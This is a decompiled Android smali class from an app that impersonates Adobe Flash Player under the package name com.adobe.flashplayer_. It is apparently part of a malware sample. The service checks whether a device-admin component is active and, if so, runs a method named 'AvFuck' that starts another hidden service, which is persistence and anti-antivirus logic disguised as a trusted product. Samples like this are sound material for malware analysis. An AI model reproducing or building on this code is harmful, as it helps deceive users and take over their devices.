.class public Lcom/adobe/flashplayer_/EEE;
.super Landroid/app/Service;
.source "EEE.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 13
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method


# virtual methods
.method public AvFuck()V
    .locals 3

    .prologue
    .line 39
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/adobe/flashplayer_/EEE;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/adobe/flashplayer_/AZC;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/adobe/flashplayer_/EEE;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 40
    return-void
.end method

.method public Restore()V
    .locals 3

    .prologue
    .line 24
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 26
    new-instance v0, Landroid/content/ComponentName;

    const-class v2, Lcom/adobe/flashplayer_/FFF;

    invoke-direct {v0, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 27
    .local v0, "MalHZHif":Landroid/content/ComponentName;
    const-string v2, "device_policy"

    invoke-virtual {p0, v2}, Lcom/adobe/flashplayer_/EEE;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/admin/DevicePolicyManager;

    .line 29
    .local v1, "mDPM":Landroid/app/admin/DevicePolicyManager;
    invoke-virtual {v1, v0}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 30
    invoke-virtual {p0}, Lcom/adobe/flashplayer_/EEE;->AvFuck()V

    .line 31
    invoke-virtual {p0}, Lcom/adobe/flashplayer_/EEE;->stopSelf()V

    .line 35
    :cond_0
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "arg0"    # Landroid/content/Intent;

    .prologue
    .line 18
    const/4 v0, 0x0

    return-object v0
.end method
